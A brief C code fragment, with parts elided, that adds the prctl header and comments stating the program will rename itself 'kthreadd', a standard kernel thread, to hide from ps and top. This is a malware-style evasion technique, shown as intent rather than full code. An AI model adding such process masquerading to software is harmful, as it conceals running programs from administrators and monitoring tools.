...
#include <sys/wait.h>
#include <sys/prctl.h> // NEW: Required for PR_SET_NAME
...
int main(int argc, char *argv[]) {
    ...
    // NEW: Spoof the process name to hide from `ps` and `top`
    // We rename ourselves to "kthreadd" (a standard kernel thread)
